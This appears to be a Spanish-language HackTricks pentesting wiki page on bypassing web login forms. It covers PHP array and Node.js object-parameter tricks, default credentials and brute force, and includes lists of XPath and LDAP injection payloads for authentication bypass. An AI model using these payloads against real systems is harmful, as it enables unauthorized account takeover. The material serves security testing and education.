# Login Bypass

{{#include ../../banners/hacktricks-training.md}}

## **Bypass de inicio de sesión regular**

Si encuentras una página de inicio de sesión, aquí puedes encontrar algunas técnicas para intentar eludirla:

- Verifica los **comentarios** dentro de la página (¿desplazarte hacia abajo y a la derecha?)
- Verifica si puedes **acceder directamente a las páginas restringidas**
- Verifica **no enviar los parámetros** (no envíes ninguno o solo 1)
- Verifica el **error de comparaciones de PHP:** `user[]=a&pwd=b`, `user=a&pwd[]=b`, `user[]=a&pwd[]=b`
- **Cambia el tipo de contenido a json** y envía valores json (incluido bool true)
- Si recibes una respuesta diciendo que POST no es compatible, puedes intentar enviar el **JSON en el cuerpo pero con una solicitud GET** con `Content-Type: application/json`
- Verifica el posible error de análisis de nodejs (lee [**esto**](https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4)): `password[password]=1`
- Nodejs transformará esa carga útil a una consulta similar a la siguiente: ` SELECT id, username, left(password, 8) AS snipped_password, email FROM accounts WHERE username='admin' AND`` `` `**`password=password=1`**`;` lo que hace que el bit de la contraseña sea siempre verdadero.
- Si puedes enviar un objeto JSON, puedes enviar `"password":{"password": 1}` para eludir el inicio de sesión.
- Recuerda que para eludir este inicio de sesión aún necesitas **conocer y enviar un nombre de usuario válido**.
- **Agregar la opción `"stringifyObjects":true`** al llamar a `mysql.createConnection` eventualmente **bloqueará todos los comportamientos inesperados cuando se pase `Object`** en el parámetro.
- Verifica las credenciales:
- [**Credenciales predeterminadas**](../../generic-hacking/brute-force.md#default-credentials) de la tecnología/plataforma utilizada
- **Combinaciones comunes** (root, admin, password, nombre de la tecnología, usuario predeterminado con alguna de estas contraseñas).
- Crea un diccionario usando **Cewl**, **agrega** el **nombre de usuario** y la contraseña **predeterminados** (si los hay) y trata de forzarlo usando todas las palabras como **nombres de usuario y contraseñas**
- **Fuerza bruta** usando un **diccionario más grande (**[**Fuerza bruta**](../../generic-hacking/brute-force.md#http-post-form)**)**

### Bypass de autenticación por inyección SQL

[Aquí puedes encontrar varios trucos para eludir el inicio de sesión a través de **inyecciones SQL**](../sql-injection/#authentication-bypass).

En la siguiente página puedes encontrar una **lista personalizada para intentar eludir el inicio de sesión** a través de inyecciones SQL:

{{#ref}}
sql-login-bypass.md
{{#endref}}

### Bypass de autenticación sin inyección SQL

[Aquí puedes encontrar varios trucos para eludir el inicio de sesión a través de **No SQL Injections**](../nosql-injection.md#basic-authentication-bypass)**.**

Dado que las inyecciones NoSQL requieren cambiar el valor de los parámetros, necesitarás probarlas manualmente.

### Bypass de autenticación por inyección XPath

[Aquí puedes encontrar varios trucos para eludir el inicio de sesión a través de **inyección XPath.**](../xpath-injection.md#authentication-bypass)
```
' or '1'='1
' or ''='
' or 1]%00
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
'or string-length(name(.))<10 or'
'or contains(name,'adm') or'
'or contains(.,'adm') or'
'or position()=2 or'
admin' or '
admin' or '1'='2
```
### LDAP Injection autenticación bypass

[Aquí puedes encontrar varios trucos para eludir el inicio de sesión a través de **LDAP Injection.**](../ldap-injection.md#login-bypass)
```
*
*)(&
*)(|(&
pwd)
*)(|(*
*))%00
admin)(&)
pwd
admin)(!(&(|
pwd))
admin))(|(|
```
### Recuerdame

Si la página tiene funcionalidad de "**Recuerdame**", verifica cómo está implementada y ve si puedes abusar de ella para **tomar el control de otras cuentas**.

### Redirecciones

Las páginas generalmente redirigen a los usuarios después de iniciar sesión, verifica si puedes alterar esa redirección para causar un [**Open Redirect**](../open-redirect.md). Tal vez puedas robar alguna información (códigos, cookies...) si rediriges al usuario a tu web.

## Otras Comprobaciones

- Verifica si puedes **enumerar nombres de usuario** abusando de la funcionalidad de inicio de sesión.
- Verifica si **autocompletar** está activo en los formularios de contraseña/**información** **sensible** **input:** `<input autocomplete="false">`

## Herramientas Automáticas

- [HTLogin](https://github.com/akinerkisa/HTLogin)



{{#include ../../banners/hacktricks-training.md}}
